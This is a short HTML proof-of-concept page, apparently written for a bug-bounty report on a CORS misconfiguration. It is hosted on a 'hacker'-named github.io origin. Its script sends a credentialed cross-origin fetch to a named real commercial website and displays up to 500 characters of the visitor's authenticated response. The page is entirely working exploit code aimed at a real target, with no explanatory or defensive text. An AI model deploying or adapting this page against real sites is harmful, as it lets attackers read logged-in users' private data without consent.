<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS PoC - Reading authenticated data</h2>
<p>Origin: <strong>hacker420818.github.io</strong></p>
<pre id="result">Fetching...</pre>
<script>
fetch("https://www.harmanaudio.com/", {
  method: "GET",
  credentials: "include",
  mode: "cors"
})
.then(r => {
  document.getElementById("result").innerText = 
    "SUCCESS!\nStatus: " + r.status + "\nURL: " + r.url;
  return r.text();
})
.then(data => {
  document.getElementById("result").innerText += 
    "\n\nData received:\n" + data.substring(0, 500);
})
.catch(e => {
  document.getElementById("result").innerText = "Error: " + e;
});
</script>
</body>
</html>
